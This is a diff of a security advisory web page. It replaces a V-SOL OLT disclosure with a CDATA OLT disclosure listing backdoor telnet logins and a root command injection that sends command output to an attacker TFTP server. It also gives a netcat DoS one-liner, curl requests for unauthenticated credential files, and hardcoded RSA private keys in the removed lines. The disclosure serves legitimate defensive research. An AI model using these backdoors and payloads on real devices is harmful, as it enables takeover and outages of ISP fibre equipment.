@@ -36,253 +36,445 @@ h1, h2, h3, h4 {
 
     <div class="hero-unit faq">
         <div class="ac">
-            <h2><a href="2020-07-14-v-sol-olt-0day-vulnerabilities.html">Multiple vulnerabilities found in V-SOL OLTs</a></h2>
+            <h2><a href="2020-07-07-cdata-olt-0day-vulnerabilities.html">Multiple vulnerabilities found in CDATA OLTs</a></h2>
         </div>
     </div>
 
     <div>
         <h2>Product Description</h2>
-<p>The V-SOL OLTs are FTTH OLTs allowing to provide FTTH connectivity to a large number of clients (using ONTs).
+<p>The CDATA OLTs are OEM FTTH OLTs, sold under different brands (Cdata, OptiLink, BLIY), allowing to provide FTTH connectivity to a large number of clients (using ONTs).
 Some of the devices support multiple 10-gigabit uplinks and provide Internet connectivity to up to 1024 ONTs (clients).</p>
-<p>We validated the vulnerabilities against V1600D4L OLT in our lab environment with the latest firmware versions (V1.01.49).</p>
+<p>We validated the vulnerabilities against FD1104B and FD1108SN OLTs in our lab environment with the latest firmware versions (V1.2.2 and 2.4.05_000, 2.4.04_001 and 2.4.03_000).
+<img alt="" src="images/2020-olt.jpg" /></p>
 <p>Using static analysis, these vulnerabilities also appear to affect all available OLT models as the codebase is similar:</p>
 <ul>
-<li>V1600D (V2.03.69 and V2.03.57)</li>
-<li>V1600D4L (V1.01.49)</li>
-<li>V1600D-MINI (V1.01.48)</li>
-<li>V1600G1 (V2.0.7 and V1.9.7)</li>
-<li>V1600G2 (V1.1.4)</li>
+<li>72408A</li>
+<li>9008A</li>
+<li>9016A</li>
+<li>92408A</li>
+<li>92416A</li>
+<li>9288</li>
+<li>97016</li>
+<li>97024P</li>
+<li>97028P</li>
+<li>97042P</li>
+<li>97084P</li>
+<li>97168P</li>
+<li>FD1002S</li>
+<li>FD1104</li>
+<li>FD1104B</li>
+<li>FD1104S</li>
+<li>FD1104SN</li>
+<li>FD1108S</li>
+<li>FD1204S-R2</li>
+<li>FD1204SN</li>
+<li>FD1204SN-R2</li>
+<li>FD1208S-R2</li>
+<li>FD1216S-R1</li>
+<li>FD1608GS</li>
+<li>FD1608SN</li>
+<li>FD1616GS</li>
+<li>FD1616SN</li>
+<li>FD8000</li>
 </ul>
-<p>We believe these models are also vulnerable:</p>
-<ul>
-<li>V1600D2-L</li>
-<li>V1600D2</li>
-<li>V1600D4</li>
-<li>V1600D4-DP</li>
-<li>V1600D8</li>
-<li>V1600D16</li>
-<li>V1600G0</li>
-</ul>
-<p><img alt="" src="images/2020-v-sol-olt.jpg" /></p>
+<p>From the analyzed binaries, we extracted information about the OEM vendor:</p>
+<pre><code>CDATA
+Flat 6, Bldg 4,South 2 of Honghualing Industrial Zone, Liuxian Road, Xili Town, Shenzhen, Guangdong, China(518055)
+marketing@cdatatec.com
+</code></pre>
 <p>For explanation about FTTH architecture, you can check my previous research at <a href="http://pierrekim.github.io/blog/2016-11-01-gpon-ftth-networks-insecurity.html">http://pierrekim.github.io/blog/2016-11-01-gpon-ftth-networks-insecurity.html</a>.</p>
 <h2>Vulnerabilities Summary</h2>
 <p>The summary of the vulnerabilities is:</p>
 <ol>
 <li><a href="#backdoor-telnet">Backdoor Access with telnet</a></li>
-<li><a href="#enable-backdoor">Enable Backdoor</a></li>
-<li><a href="#hardcoded-RSA">Hardcoded RSA keys</a></li>
-<li><a href="#command-injection-root">Potential command injection</a></li>
-<li><a href="#code-quality">Code quality</a></li>
-<li><a href="#backdoor-account-creation">Backdoor used for account creation</a></li>
-<li><a href="#backdoor-V1600D">Backdoor specific to V1600D model</a></li>
+<li><a href="#credentials-infoleak-telnet">Credentials infoleak and credentials in clear-text (telnet)</a></li>
+<li><a href="#command-injection-root">Escape shell with root privileges</a></li>
+<li><a href="#pre-auth-remote-dos">Pre-Auth Remote DoS</a></li>
+<li><a href="#credentials-infoleak-web">Credentials infoleak and credentials in clear-text (HTTP)</a></li>
+<li><a href="#weak-encryption-algorithm">Weak encryption algorithm</a></li>
 <li><a href="#insecure-management-interfaces">Insecure management interfaces</a></li>
 </ol>
 <p><a id="backdoor-telnet"></a></p>
 <h2>Details - Backdoor Access with telnet</h2>
 <p>A telnet server is running in the appliance and is reachable from the WAN interface and from the FTTH LAN interface (from the ONTs).</p>
-<p>You can find below backdoor (undocumented) credentials, giving an attacker a low-privilege CLI access.</p>
-<pre><code>login: admin
-password: !j@l#y$z%x6x7q8c9z)
+<p>Depending on the firmware, the backdoor credentials may change. You can find below a complete list of backdoor (undocumented) credentials, giving an attacker a complete administrator CLI access.</p>
+<p>Previous and old versions can be abused with:</p>
+<pre><code>login: suma123
+password: panger123
 </code></pre>
-<p>The credentials have been extracted from firmware images:</p>
-<p><img alt="" src="images/2020-olt-v-sol-backdoor-telnet.png" /></p>
-<p><center>Authentication process with hardcoded credentials</center></p>
+<p>New recent versions can be abused with:</p>
+<pre><code>login: debug
+password: debug124
+
+login: root
+password: root126
+
+login: guest
+password: [empty]
+</code></pre>
+<p><img alt="" src="images/2020-olt-sub_7740A4.png" />
+<center>Authentication process with hardcoded credentials</center></p>
+<p>The credentials have been extracted from old and new firmware images.</p>
+<p>About the credentials, it depends on the vendors and the version of the firmware - the appearance of the CLI may be different but the access still works.</p>
+<p>Using <code>suma123</code>/<code>panger123</code>:</p>
 <pre><code>$ telnet [ip]
-Trying [ip]...
-Connected to [ip].
-Escape character is '^]'.
+********************************************************************
+        Command Line Interface for EPON System
+                 Hardware Ver:  V1.2
+                 Software Ver:  V1.2.2
+                 Created Time:  Mar 12 2018 06:54:24
+    Copyright (c) 2015-2020 All rights reserved.
+********************************************************************
+Username:panger123
+Password:suma123
 
-Hello, this is epon olt platform (version 1.00).
-Copyright 2010-2018,All Rights Reserved.
+Entry Supperuer successfully!
 
-
-User Access Verification
-
-Bad UserName or Bad Password , Login Failed.
-
-Please retry
-
-Login: admin
-Password: !j@l#y$z%x6x7q8c9z)
-
-olt&gt; list
-  enable    Turn on privileged mode command
-  exit      Exit current mode and down to previous mode
-  help      Description of the interactive help system
-  list      Print command list
-  quit      Exit current mode and down to previous mode
-  show      Show running system information
-  terminal  Set terminal line parameters
-  vty       Virtual terminal
-  who       Display who is on vty
-olt&gt;
+epon@
+ alarm                     - setting system alarm
+ best-sys                  - configure sys information
+ epon-workmode             - configure EPON working-mode
+ ethernet-ring             - configure rapid ring
+ igmp-snooping             - configure IGMP Snooping
+ interface                 - interface type
+ ipconfig                  - configure the system IP address
+ logout                    - exit the CLI system
+ mac-address-table         - ctrl-card dynamic mac address table management
+ mirror                    - configure switch mirror
+ onu-auth                  - configure authentication mode for Olt
+ ping                      - net ping
+ port-isolate-group        - create port-isolate-group, you must enable port-isolate-mode for group
+ rmon                      - configure RMON
+ rstp                      - rapid spanning tree protocol configuration
+ show                      - show system configuration
+ system                    - configure systerm
+ trunk                     - enter trunk config mode
+ undo                      - delete relational configuration
+ vlan                      - enter vlan config mode
+epon@
 </code></pre>
-<p><a id="enable-backdoor"></a></p>
-<h2>Details - Enable Backdoor</h2>
-<p>It is possible to elevate the privileges using the password <code>!j@l#y$z%x6x7q8c9z)</code> and to get a complete administrator CLI access:</p>
-<pre><code>olt&gt; enable
-Password: !j@l#y$z%x6x7q8c9z)
-olt# 
-  clear      Reset functions
-  configure  Configuration from vty interface
-  copy       Copy configuration
-  disable    Turn off privileged mode command
-  end        Exit current mode and down to previous mode
-  exit       Exit current mode and down to previous mode
-  help       Description of the interactive help system
-  ip         Global IP configuration subcommands
-  list       Print command list
-  no         Negate a command or set its defaults
-  quit       Exit current mode and down to previous mode
-  show       Show running system information.
-  terminal   Set terminal line parameters
-  vty        Virtual terminal
-  who        Display who is on vty
-  write      Write running configuration to memory, network, or terminal
-olt#
+<p>Using <code>guest</code>/<code>[empty]</code>:</p>
+<pre><code>$ telnet [ip]
+********************************************************************
+        Command Line Interface for EPON System
+                 Hardware Ver:  V3.2
+                 Software Ver:  2.4.04_001
+                 Created Time:  Nov 27 2017 10:38:49
+    Copyright (c) 2006-2015 All rights reserved.
+********************************************************************
+Username:guest
+Password:[empty]
+epon#
+--------------------------------------------------
+  Local Configuration Command
+--------------------------------------------------
+
+--------------------------------------------------
+  Global Command
+--------------------------------------------------
+ broadcast            - Write message to all users logged in
+ clear                - Clear the screen
+ history              - Show command history
+ logout               - Log off this system
+ ping                 - Ping a network hosts
+ show                 - show system configuration
+ tracert              - trace the route to host
+ tree                 - Show command tree
+
+epon# show
+--------------------------------------------------
+  Local Configuration Command
+--------------------------------------------------
+ acl                  - Show ACL(s)
+ auth                 - show olt auth mode
+ dhcp-snooping        - show dhcp snooping configurations
+ exec-timeout         - show cli console timeout
+ igmp                 - show igmp snooping configurations
+ mac-address          - mac-address
+ mac-address-table    - show current port's mac address
+ mirror               - show switch mirror configurations
+ olt                  - show olt's configuration
+ onu-position         - show the position of onu by mac
+ qinq                 - show QinQ configuration
+ rmon                 - show RMON
+ rstp                 - Display RSTP information
+ running-config       - show current running-configuration
+ startup-config       - show current startup-configuration
+ swmode               - show swmode
+ swport               - display port attribute information
+ system               - show system configuration
+ trunk                - show trunk configuration
+ vlan                 - show vlan configuration
+ web                  - web server!
+epon#
 </code></pre>
-<p>With this access, an attacker can completely overwrite the configuration as well as the firmware.</p>
-<p><img alt="" src="images/2020-olt-v-sol-enable-telnet.png" />
-<center>Hardcoded Enable password</center></p>
-<p><a id="hardcoded-RSA"></a></p>
-<h2>Details - Hardcoded RSA keys</h2>
-<p>The firmware images contain hardcoded RSA keys, used to provide SSL encryption for the web server.</p>
-<p>V1600D4L and V1600D-MINI:</p>
-<pre><code>$ cat self.key 
------BEGIN RSA PRIVATE KEY-----
-MIICXAIBAAKBgQDPca1RbgPDdqZ2n2m1PQ/s2IANv55GJhKF9CtkMIEpHEhbTixH
-pcNE02oQoJFTK5EL21A3JftekVk3DCKK68ncIJAAWmzJp63QpEovZr9ySQubkk39
-/+kHxsfkUmR3SldyLctaT+o7qAy4W/BM6tp00mXWKhFHerXmABf/vGt89QIDAQAB
-AoGAe3cvLs4J02ZlASk0Iziqp87buFMaAqpaT/vZb5Im7a71qdJHLIWOSQKDmE3Y
-8OV3ONVZUtl6WPitXsQMMx7PTvCELDvNMGmGJ31zOpE1zXl8vlh5QQzTfLZxjE1r
-SfWXoYNUcV4uiOfXNgJaOBzz4l8W8CjE6TyDF0DD3WsdQMECQQDpTMo5VD9ifaoW
-r1nahaaVTPyTyd7GQgO7jyXIdlZ+mL0G8xUF6CnIw1G3kG+6l4oLsAqpj2SIFOcn
-rz/Zxq89AkEA46DZRloNL6hNEWZvL9dboqp/7f4sILItE6WfANsqM5oeIPA1T3ge
-nYK5VwU2Jm4N3oaLq9fPfESWtAC/5FvgGQJAGcthuID2GR+nxKZSmvSX/H3slzKE
-rQrzerNTDBz5Zznf/Hq34lVO+WGPEWqoz8qderlWFHVEOj+FZz/bIWr0SQJAJk6K
-YhmDgJKtLZF0grOWW0CgONf+ax4xEc5cfNNlPbvg+CAUiKQpWs6GDEv3Oe5pbRpt
-ZOTzqPEN/4rkwDRp+QJBAOZUwGwi3pHU8T9K15qR1Em/o+buRoc8hFyyv1CSmAWZ
-uXFnRzbruUlQ6/lMF3MU7U4TTOD7tnhOVq1Ub+Rgnzs=
------END RSA PRIVATE KEY-----
-$ cat self.crt
------BEGIN CERTIFICATE-----
-MIICkDCCAfmgAwIBAgIJALvknsR/6Fr2MA0GCSqGSIb3DQEBBQUAMGExCzAJBgNV
-BAYTAi4uMQswCQYDVQQIDAIuLjELMAkGA1UEBwwCLi4xCzAJBgNVBAoMAi4uMQsw
-CQYDVQQLDAIuLjELMAkGA1UEAwwCLi4xETAPBgkqhkiG9w0BCQEWAi4uMB4XDTE4
-MDcyNjA5MDEwMloXDTIxMDcyNTA5MDEwMlowYTELMAkGA1UEBhMCLi4xCzAJBgNV
-BAgMAi4uMQswCQYDVQQHDAIuLjELMAkGA1UECgwCLi4xCzAJBgNVBAsMAi4uMQsw
-CQYDVQQDDAIuLjERMA8GCSqGSIb3DQEJARYCLi4wgZ8wDQYJKoZIhvcNAQEBBQAD
-gY0AMIGJAoGBAM9xrVFuA8N2pnafabU9D+zYgA2/nkYmEoX0K2QwgSkcSFtOLEel
-w0TTahCgkVMrkQvbUDcl+16RWTcMIorrydwgkABabMmnrdCkSi9mv3JJC5uSTf3/
-6QfGx+RSZHdKV3Ity1pP6juoDLhb8Ezq2nTSZdYqEUd6teYAF/+8a3z1AgMBAAGj
-UDBOMB0GA1UdDgQWBBTDWRDTYuzjtF3+rk0jaBTKRIMtXjAfBgNVHSMEGDAWgBTD
-WRDTYuzjtF3+rk0jaBTKRIMtXjAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBBQUA
-A4GBAJgxXbMJQYEXOvrP5PcCUkq16o5bt83x3xCkZ9+Yv7cnCRsRBAgXSMyorOMl
-+Ttt3CSTNp5jwHcDhysth4V5/SSkJ46DkUmID2WzzxIjL82MOYAv/na6QTGNUAcz
-7VLEX/QuBzS7jLczZ9WtOrgZ0ma2TjIZJOpT32guKZYeyL+r
------END CERTIFICATE-----
+<p>Using <code>root</code>/<code>root126</code>:</p>
+<pre><code>$ telnet [ip]
+********************************************************************
+        Command Line Interface for EPON System
+                 Hardware Ver:  V3.2
+                 Software Ver:  2.4.04_001
+                 Created Time:  Nov 27 2017 10:38:49
+    Copyright (c) 2006-2015 All rights reserved.
+********************************************************************
+Username:root
+Password:root126
+epon#
+--------------------------------------------------
+  Local Configuration Command
+--------------------------------------------------
+ acl                  - Create ACL(s)
+ acl-del              - Delete ACL(s)
+ auth                 - configure authentication mode for Olt
+ btv                  - btv
+ cdt-sys              - configure sys information
+ dhcp-snooping        - configure DHCP Snooping
+ exec-timeout         - set a timeout value
+ igmp                 - configure IGMP Snooping
+ mac-address          - ctrl-card dynamic mac address table management
+ mirror               - configure switch mirror
+ multicast-vlan       - multicast-vlan &lt;mvlan&gt;
+ no                   - no
+ olt                  - configure OLT
+ reset                - reset the values
+ rmon                 - configure RMON
+ rstp                 - rapid spanning tree protocol configuration
+ swmode               - set basic switch mode
+ swport               - enter switch port config mode
+ system               - configure systerm
+ trunk                - enter trunk config mode
+ vlan                 - enter vlan config mode
+
+--------------------------------------------------
+  Global Command
+--------------------------------------------------
+ broadcast            - Write message to all users logged in
+ clear                - Clear the screen
+ debug                - debug
+ history              - Show command history
+ logout               - Log off this system
+ ping                 - Ping a network hosts
+ show                 - show system configuration
+ tracert              - trace the route to host
+ tree                 - Show command tree
+ who                  - Display users currently logged in
+epon#
 </code></pre>
-<p>V1600D, V1600G1 and V1600G2:</p>
-<pre><code>$ cat usr/sbin/self.key
------BEGIN RSA PRIVATE KEY-----
-MIICXQIBAAKBgQDQYaaee6igp8RpOXUq+82WUOXm8pSjIXBj6U9RRki9kLcu8vV/
-80g/vdyPdartkhvG7tG5kJLSZ464+uDNbZpnEk4LZbN9vAY8rgmc/2SFYFYiKb82
-bcKpV6e4EuCXc0VPC27zlywikVFHg2g9Dva6bnuPqXj+JRUNK/ER4PADTwIDAQAB
-AoGAC0Mb1DjutjAbB2zZjkcpp1Qb+M1nhyGJh3zWkpfv2n71x43OAupNH1TNlNtR
-L6HT6n6ByzurE8AREKJOgAvKamqiyPM8kPZKFEeBqqDOhm3ZXOsjsS5okpzMR4H4
-CHbJO8dm1siM3fKG2UdrSGiwJw27wB1NRRcocQkcixIez9ECQQD5XTxUhe/CGPAF
-AA4q8srNvkG5oRd1eVLr6cyoEzbqwd3VnVHUzIn3fBYul1T3pZUkNF9RrmFENPTA
-Sf5P+DBtAkEA1e05mYZLa8IJnlgvGlLZn8Mvwpy5fNuMrEqwtiWFn6naG8FIwosR
-7FBdQWfUlCslu2dKSTx9n9x3tkV9w2zFKwJBANWrinJygcqzS5c9QOaUPCqnh/Hj
-kxJZ7y+ummq6bCgkDk1oDCJnUSD69pbdnTTGcVEgfzyiSz4CkmXiAUPMytECQE+c
-YbQdgxHN+xBfVuAf9vb6h1qQQoMRnU882HhgjFK3vgBYNMCZSok7+whtIHIngHo2
-XTHV/hYw0KgXQk8oulMCQQDJD7WusXmuND+PQp24/t19d/FyhITHc/CDwsKN6tW0
-8WfkCwMgDBqDiBtBd/S2gs6yJVpaP3HKE+Sl5cB4mPVK
------END RSA PRIVATE KEY-----
-$ cat usr/sbin/self.crt
------BEGIN CERTIFICATE-----
-MIICkDCCAfmgAwIBAgIJAOkwF33vgssHMA0GCSqGSIb3DQEBBQUAMGExCzAJBgNV
-BAYTAi4uMQswCQYDVQQIDAIuLjELMAkGA1UEBwwCLi4xCzAJBgNVBAoMAi4uMQsw
-CQYDVQQLDAIuLjELMAkGA1UEAwwCLi4xETAPBgkqhkiG9w0BCQEWAi4uMB4XDTE4
-MDcyNzA4MTMxNVoXDTIxMDcyNjA4MTMxNVowYTELMAkGA1UEBhMCLi4xCzAJBgNV
-BAgMAi4uMQswCQYDVQQHDAIuLjELMAkGA1UECgwCLi4xCzAJBgNVBAsMAi4uMQsw
-CQYDVQQDDAIuLjERMA8GCSqGSIb3DQEJARYCLi4wgZ8wDQYJKoZIhvcNAQEBBQAD
-gY0AMIGJAoGBANBhpp57qKCnxGk5dSr7zZZQ5ebylKMhcGPpT1FGSL2Qty7y9X/z
-SD+93I91qu2SG8bu0bmQktJnjrj64M1tmmcSTgtls328BjyuCZz/ZIVgViIpvzZt
-wqlXp7gS4JdzRU8LbvOXLCKRUUeDaD0O9rpue4+peP4lFQ0r8RHg8ANPAgMBAAGj
-UDBOMB0GA1UdDgQWBBQIoRN/VYOmUzwPXlHCZrZi4XPv4zAfBgNVHSMEGDAWgBQI
-oRN/VYOmUzwPXlHCZrZi4XPv4zAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBBQUA
-A4GBAB0bY8gSse39BwzXtXnzSOpln0CIwjr3xI7nLvzGhf4Xooktf9zDTQBONOzh
-eRjSLluVJl9kYIBY4j2Y5nbSwjaWD0Imaa6z5FBro0e3SyGq84tlZyFW8SijdFLC
-jN04hXrqdov/ATL6QCaHlGzbPMG4KBiPfwAiiYVlRL3B0vJN
------END CERTIFICATE-----
+<p>Using <code>debug</code>/<code>debug124</code>:</p>
+<pre><code>$ telnet [ip]
+********************************************************************
+        Command Line Interface for EPON System
+                 Hardware Ver:  V3.2
+                 Software Ver:  2.4.04_001
+                 Created Time:  Nov 27 2017 10:38:49
+    Copyright (c) 2006-2015 All rights reserved.
+********************************************************************
+Username:debug
+Password:debug124
+epon#
+--------------------------------------------------
+  Local Configuration Command
+--------------------------------------------------
+ acl                  - Create ACL(s)
+ acl-del              - Delete ACL(s)
+ auth                 - configure authentication mode for Olt
+ btv                  - btv
+ dhcp-snooping        - configure DHCP Snooping
+ exec-timeout         - set a timeout value
+ igmp                 - configure IGMP Snooping
+ mac-address          - ctrl-card dynamic mac address table management
+ mirror               - configure switch mirror
+ multicast-vlan       - multicast-vlan &lt;mvlan&gt;
+ no                   - no
+ olt                  - configure OLT
+ reset                - reset the values
+ rmon                 - configure RMON
+ rstp                 - rapid spanning tree protocol configuration
+ swmode               - set basic switch mode
+ swport               - enter switch port config mode
+ system               - configure systerm
+ trunk                - enter trunk config mode
+ vlan                 - enter vlan config mode
+
+--------------------------------------------------
+  Global Command
+--------------------------------------------------
+ broadcast            - Write message to all users logged in
+ clear                - Clear the screen
+ debug                - debug
+ history              - Show command history
+ logout               - Log off this system
+ ping                 - Ping a network hosts
+ show                 - show system configuration
+ tracert              - trace the route to host
+ tree                 - Show command tree
+ who                  - Display users currently logged in
+epon#
+</code></pre>
+<p>With these access, an attacker can completely overwrite the configuration and overwrite the firmware.</p>
+<p><a id="credentials-infoleak-telnet"></a></p>
+<h2>Details - Credentials infoleak and credentials in clear-text (telnet)</h2>
+<p>For this part, we suppose the attacker has a working CLI access (which can be achieved using <a href="#backdoor-telnet">Backdoor access with telnet</a>).</p>
+<p>It is possible to extract administrator credentials by running this command in the CLI:</p>
+<pre><code>epon# show system infor
+Web Server
+  Version          : V1.2.0
+  BuildTime        : 19-04-23
+  Administrator    : LOGIN_CLEAR_TEXT
+  Password         : PASSWORD_CLEAR_TEXT
 </code></pre>
 <p><a id="command-injection-root"></a></p>
-<h2>Detail - Potential command injection</h2>
-<p>It is possible to use TFTP to transfer some files:</p>
-<pre><code>upload tftp syslog &lt;filename&gt; &lt;A.B.C.D&gt;
-upload tftp configuration &lt;filename&gt; &lt;A.B.C.D&gt;
+<h2>Details - Escape shell with root privileges</h2>
+<p>For this part, we suppose the attacker has a working CLI access (which can be achieved using <a href="#backdoor-telnet">Backdoor access with telnet</a>).</p>
+<p>There is a command injection in the CLI allowing an attacker to execute commands as root.</p>
+<p>The command injection is located in the TFTP download configuration part.</p>
+<p>In our case, we used metasploit to start a TFTP server on 192.168.1.101 and to receive results of injected commands into this TFTP server:</p>
+<pre><code>$ msfconsole -q -x 'use auxiliary/server/tftp; run'
 </code></pre>
-<p>This is vulnerable to a command injection, allowing to run commands as root.</p>
-<p>The function starting the tftp process using system(3) will use the argument provided by the attacker, as shown below:</p>
-<p><img alt="" src="images/2020-olt-v-sol-tftp-injection.png" />
-<center>TFTP command injection</center></p>
-<p><a id="code-quality"></a></p>
-<h2>Detail - Code quality</h2>
-<p>In the firmware image of V1600D4L and V1600D-MINI, we can find the following inside the <code>init.sh</code> script:</p>
-<pre><code>$ cat init.sh
-#!/bin/sh
-[...]
-ifconfig eth0 0.0.0.0
-ifconfig eth0 up
-[...]
-
-telnetd -l /bin/sh&amp;
+<p>On the OLT:</p>
+<pre><code>epon# system configurations download olt 192.168.1.101 "$(cat /proc/cpuinfo &gt; /tmp/test &amp;&amp; tftp 192.168.1.101 put /tmp/test test)"
+Uncompress file failed!
 </code></pre>
-<p>During the update, the script appears to start telnetd without authentication.</p>
-<p><a id="backdoor-account-creation"></a></p>
-<h2>Backdoor used for account creation</h2>
-<p>The string <code>4ef9cea10b2362f15ba4558b1d5c081f</code> is being compared with an input value in the function used to create new users.</p>
-<p>The code will check if the user is <code>admin</code> or if the backdoor password <code>4ef9cea10b2362f15ba4558b1d5c081f</code> is provided.</p>
-<p>It appears it is being used to create admin users from non-admin users.</p>
-<p><img alt="" src="images/2020-olt-v-sol-backdoor-admin-create.png" />
-<center>Creation of new user, using a <code>backdoor</code> password</center></p>
-<p>Due to time constraints, we did not study this backdoor in depth.</p>
-<p><a id="backdoor-V1600D"></a></p>
-<h2>Backdoor specific to V1600D model</h2>
-<p>This backdoor appeared in version 2.03.69.</p>
-<p>The string <code>K0LTdi@gnos312$</code> is being compared with the password provided by the the remote attacker. If it matches, the access will be provided.</p>
-<p><img alt="" src="images/2020-olt-v-sol-v1600d-backdoor-debug.png" />
-<center>Authentication process with hardcoded credentials</center></p>
-<p>Due to time constraints, we did not study this backdoor in depth.</p>
+<p>On the TFTP server running on the attacker machine, we receive the output of the command <code>cat /proc/cpuinfo</code>:</p>
+<pre><code>$ cat /tmp/test
+system type             : Broadcom BCM956218
+processor               : 0
+cpu model               : Broadcom BCM3302 V5.0
+BogoMIPS                : 299.00
+wait instruction        : no
+microsecond timers      : yes
+tlb_entries             : 32
+extra interrupt vector  : no
+hardware watchpoint     : no
+ASEs implemented        : mips16
+VCED exceptions         : not available
+VCEI exceptions         : not available
+</code></pre>
+<p>It is also possible to exfiltrate information using the embedded webserver:</p>
+<p>On the OLT:</p>
+<pre><code>epon# system configurations download olt 192.168.1.101 "$(export &gt; /opt/lighttpd/web/cgi/out.txt)"
+</code></pre>
+<p>On the attacker machine:</p>
+<pre><code>$ curl http://ip/cgi/out.txt
+export HOME='/broadcom/'
+export OLDPWD='/'
+export PATH='/sbin:/usr/sbin:/bin:/usr/bin'
+export PWD='/broadcom'
+export SHELL='/bin/sh'
+export TERM='vt102'
+export USER='root'
+</code></pre>
+<p>Futhermore, everything is running as <code>root</code> in the appliance:</p>
+<pre><code>PID   USER     COMMAND
+    1 0        init
+    2 0        [ksoftirqd/0]
+    3 0        [events/0]
+    4 0        [khelper]
+    5 0        [kthread]
+    6 0        [kblockd/0]
+    7 0        [sysled]
+    8 0        [pdflush]
+    9 0        [pdflush]
+   10 0        [kswapd0]
+   11 0        [aio/0]
+   12 0        [mtdblockd]
+   13 0        {rcS} /bin/sh /etc/rcS
+   17 0        [jffs2_gcd_mtd5]
+   23 0        [bkncmd]
+   24 0        [bknevt]
+   26 0        fd1008s.dat
+   27 0        fd1008s.dat
+   28 0        fd1008s.dat
+   29 0        fd1008s.dat
+   30 0        fd1008s.dat
+   32 0        fd1008s.dat
+   33 0        fd1008s.dat
+   35 0        fd1008s.dat
+   36 0        fd1008s.dat
+   37 0        fd1008s.dat
+   38 0        fd1008s.dat
+   39 0        fd1008s.dat
+   40 0        fd1008s.dat
+   41 0        fd1008s.dat
+   42 0        fd1008s.dat
+   43 0        fd1008s.dat
+   44 0        fd1008s.dat
+   45 0        fd1008s.dat
+   46 0        fd1008s.dat
+   55 0        fd1008s.dat
+   56 0        fd1008s.dat
+   57 0        fd1008s.dat
+   58 0        fd1008s.dat
+   59 0        fd1008s.dat
+   60 0        fd1008s.dat
+   61 0        fd1008s.dat
+   64 0        fd1008s.dat
+   65 0        fd1008s.dat
+   66 0        fd1008s.dat
+   67 0        fd1008s.dat
+   68 0        fd1008s.dat
+   69 0        fd1008s.dat
+   70 0        fd1008s.dat
+   71 0        fd1008s.dat
+   72 0        fd1008s.dat
+  864 0        sh -c tftp 192.168.1.101 get $(ps a &gt; /tmp/test &amp;&amp; tftp 192.168.1.101 put /tmp/test test) /tmp/cfg_download.tar.gz
+  865 0        sh -c tftp 192.168.1.101 get $(ps a &gt; /tmp/test &amp;&amp; tftp 192.168.1.101 put /tmp/test test) /tmp/cfg_download.tar.gz
+  866 0        ps a
+</code></pre>
+<p><a id="pre-auth-remote-dos"></a></p>
+<h2>Details - Pre-Auth Remote DoS</h2>
+<p>A telnet server is running in the appliance and is reachable from the WAN interface and from the FTTH LAN interface (from the ONTs).</p>
+<p>Using our cutting-edge fuzzing technology based on IA, machine-learning and shawarma, we are able to reboot any OLT from this vendor using this command:</p>
+<pre><code>$ for i in $(seq 1 10); do cat /dev/urandom | nc 192.168.1.100 23 | hexdump -C;done
+</code></pre>
+<p>The device will reboot in the next 5 seconds and all the LEDs will blink like a Christmas tree!</p>
+<p><a id="credentials-infoleak-web"></a></p>
+<h2>Details - Credentials infoleak and credentials in clear-text (HTTP)</h2>
+<p>A web server is running in the appliance and is reachable from the WAN interface and from the FTTH LAN interface (from the ONTs).</p>
+<p>Without authentication, an attacker can extract web, telnet credentials and SNMP communities (read and write) by fetching these files:</p>
+<pre><code>/opt/lighttpd/web/cgi/snmp_read.txt
+/opt/lighttpd/web/cgi/snmp_write.txt
+/opt/lighttpd/web/cgi/web_login.txt
+/opt/lighttpd/web/cgi/web_passwd.txt
+/opt/lighttpd/web/cgi/onu_name.txt
+/opt/lighttpd/web/cgi/oem.txt
+</code></pre>
+<p>Using <code>curl</code>:</p>
+<pre><code>$ curl http://ip/cgi/snmp_read.txt
+$ curl http://ip/cgi/snmp_write.txt
+$ curl http://ip/cgi/oem.txt
+$ curl http://ip/cgi/onu_name.txt
+$ curl http://ip/cgi/web_passwd.txt
+$ curl http://ip/cgi/web_login.txt
+</code></pre>
+<p><a id="weak-encryption-algorithm"></a></p>
+<h2>Details - Weak encryption algorithm</h2>
+<p>A custom encryption algorithm is used to store encrypted passwords. This algorithm will XOR the password with the hardcoded value <code>*j7a(L#yZ98sSd5HfSgGjMj8;Ss;d)(*&amp;^#@$a2s0i3g</code> as shown below:</p>
+<p><img alt="" src="images/2020-olt-FUN_007bcdc4.png" /></p>
 <p><a id="insecure-management-interfaces"></a></p>
 <h2>Details - Insecure management interfaces</h2>
-<p>By default, the appliance can only be managed remotely with HTTP, HTTPS, telnet and SNMP. Some devices may support SSH. Furthermore, SSL is using hardcoded keys. An attacker can intercept passwords sent in clear-text and MITM the management of the appliance.</p>
+<p>By default, the appliance can be managed remotely only with HTTP, telnet and SNMP. It doesn't support SSL/TLS for HTTP or SSH. An attacker can intercept passwords sent in clear-text and MITM the management of the appliance.</p>
 <h2>Dorks</h2>
-<p><code>Hello, this is epon olt platform (version 1.00).</code></p>
-<p><code>Copyright 2010-2018,All Rights Reserved.</code></p>
+<p><code>EPON System</code></p>
+<p><code>Optilink GEPON</code></p>
 <h2>Vendor Response</h2>
 <p>Full-disclosure is applied as we believe some backdoors are intentionally placed by the vendor.</p>
-<p>The vendor reached me after the publication for more details about the vulnerabilities and started to provide new firmware images from July 14, 2020. The default hardcoded password has been removed in all the firmware images.</p>
-<p>Customers have been advised to update their devices with the latest firmware images. Patched firmware images are available at <a href="https://www.vsolcn.com/download/">https://www.vsolcn.com/download/</a>.</p>
 <h2>Report Timeline</h2>
 <ul>
-<li>Dec 29, 2019: Vulnerabilities found and this advisory was written.</li>
-<li>Jul 14, 2020: A public advisory is sent to security mailing lists.</li>
-<li>July 14, 2020: V-SOL reaches me asking for details about the vulnerabilities and confirms they are working to address security patches as soon as possible.</li>
-<li>July 14, 2020: V-SOL starts to provide updated firmware images.</li>
-<li>July 21, 2020: After analyzing all the updated firmware images, it is confirmed that the default hardcoded password has been removed.</li>
+<li>Dec 27, 2019: Vulnerabilities found and this advisory was written.</li>
+<li>Jul 07, 2020: A public advisory is sent to security mailing lists.</li>
+<li>Jul 14, 2020: V-SOL removed.</li>
 </ul>
 <h2>Credits</h2>
-<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>) and Alexandre Torres (<a href="https://twitter.com/@AlexTorSec">@AlexTorSec</a>).</p>
+<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>) and Alexandre Torres.</p>
 <h2>References</h2>
